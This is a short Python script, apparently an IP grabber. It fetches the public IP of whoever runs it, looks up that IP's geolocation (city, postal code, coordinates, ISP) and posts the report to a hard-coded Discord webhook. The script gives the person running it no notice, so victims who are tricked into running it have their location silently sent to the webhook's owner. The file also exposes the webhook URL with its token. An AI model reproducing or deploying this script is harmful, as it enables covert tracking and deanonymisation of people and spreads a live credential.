import requests

webhook = "https://discord.com/api/webhooks/1568344051365711922/8wsoRQRVOcxd4OnQXL-YovC3dUgq-iwZm4HprnKK_Hwid9rKvjDc2UnsfYWI0oTudEbQ" 

def get_ip():
    response = requests.get(
        "https://api.ipify.org",
        params={"format":"json"}
    )
    return response.json()["ip"]

output_ip = get_ip()
url = f"https://ipinfo.io/{output_ip}/json"

def info():
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        data = response.json()

        # Create a string to hold the text we want to print and send
        report = "\n========== IP INFORMATION ==========\n"

        fields = {
            "IP Address": "ip",
            "Hostname": "hostname",
            "City": "city",
            "Region": "region",
            "Country": "country",
            "Postal Code": "postal",
            "Coordinates": "loc",
            "Organization / ISP": "org",
            "Timezone": "timezone"
        }

        for label, key in fields.items():
            report += f"{label}: {data.get(key, 'Not available')}\n"

        report += "===================================="
        
       
        
        
        return report

    except requests.exceptions.RequestException as e:
        return f"Request error: {e}"
    except ValueError:
        return "Invalid response from IPinfo."

# Call the function and catch the returned string report
final_report = info()

# CORECTAT: No more bare curly braces around the variable
requests.post(webhook, json={
    "content": final_report
})
